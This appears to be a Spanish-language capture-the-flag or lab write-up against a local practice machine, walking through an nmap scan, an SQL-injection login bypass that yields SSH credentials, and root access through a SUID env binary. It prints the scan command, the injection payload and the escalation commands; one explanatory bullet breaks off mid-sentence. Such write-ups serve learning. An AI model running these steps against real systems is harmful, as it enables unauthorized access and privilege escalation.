Fecha: 07/08/2024

Empiezo haciendo nmap: 
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](Imágenes/Pasted%20image%2020240807093218.png)

Compruebo ambas versiones con searchsploit, sin encontrar resultados. 

Visito la el servidor http desde un navegador, encontrando un formulario de login. Pruebo si puedo hacer SQL Inyection (escribiendo ' en el usuario y cualquier cosa en la contraseña), y obtengo que sí. 
![](Imágenes/Pasted%20image%2020240807093509.png)

Utilizo `admin` como usuario y `admin' OR '1'='1` como contraseña, con lo que obtengo un usuario y contraseña que pruebo conectándome por ssh a la máquina. (satisfactoriamente) 

![](Imágenes/Pasted%20image%2020240807093817.png)
Busco programas con el bit SUID: 
``` 
find / -perm -4000 -user root 2>/dev/null
```

![](Imágenes/Pasted%20image%2020240807094900.png)

Probaré con env, abriendo una terminal y consiguiendo ser root:
```
/usr/bin/env /bin/bash -p
```

- /usr/bin/env se usa para ejecutar un comando en un nuevo entorno modificado. 
- /bin/bash es el comando que ejecuto
- -p es una opción que tienen bash y sh para 

![](Imágenes/Pasted%20image%2020240807095221.png)
